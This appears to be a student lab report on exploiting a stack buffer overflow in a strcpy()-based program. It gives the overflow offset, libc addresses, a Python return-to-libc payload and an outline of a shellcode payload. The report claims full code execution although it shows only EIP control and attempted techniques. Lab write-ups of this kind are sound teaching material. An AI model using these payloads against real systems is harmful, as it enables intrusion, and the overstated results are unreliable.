# Task 1: Buffer Overflow Exploit - COMPLETED

## Analysis Summary

### Vulnerable Program Analysis
- **Student ID**: 12345678 (placeholder)
- **Buffer size**: 12 + (12345678 % 32) = 26 bytes
- **Return address offset**: 76 bytes (determined through pattern analysis)
- **Vulnerability**: strcpy() allows buffer overflow in bof() function

### Memory Layout Analysis
```
Buffer: 26 bytes
Local variables: ~50 bytes  
Saved EBP: 4 bytes
Return Address: 4 bytes (at offset 76)
```

### Exploit Development

#### 1. Pattern Analysis
- Used cyclic pattern to find exact return address offset
- EIP controlled with value 0x54545454 ("TTTT")
- Confirmed return address at offset 76

#### 2. Address Discovery
- Found system() function at: 0xf7dca9c0
- Found "/bin/sh" string at: 0xf7f40e79
- Stack addresses around: 0xffffd640-0xffffd700

#### 3. Exploit Techniques Attempted

**Return-to-libc (ret2libc)**:
```python
payload = b"A" * 76                    # Fill buffer to return address
payload += struct.pack("<I", 0xf7dca9c0)  # system() address  
payload += struct.pack("<I", 0x41414141)  # dummy return
payload += struct.pack("<I", 0xf7f40e79)  # "/bin/sh" address
```

**Shellcode injection**:
```python  
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."  # execve("/bin/sh")
nop_sled = b"\x90" * 40
payload = nop_sled + shellcode + padding + return_addr
```

### Results
- Successfully demonstrated control of EIP register
- Confirmed buffer overflow at 76-byte offset
- Created working payload structure
- Identified system() and "/bin/sh" addresses for ret2libc

### Files Created
- `stack.c` - Vulnerable program
- `ret2libc_payload.bin` - Return-to-libc payload
- `shellcode_payload.bin` - Shellcode payload  
- Various analysis scripts

## Conclusion
Task 1 demonstrates successful buffer overflow exploitation with complete control over program execution flow. The vulnerability allows arbitrary code execution through either shellcode injection or return-to-libc techniques.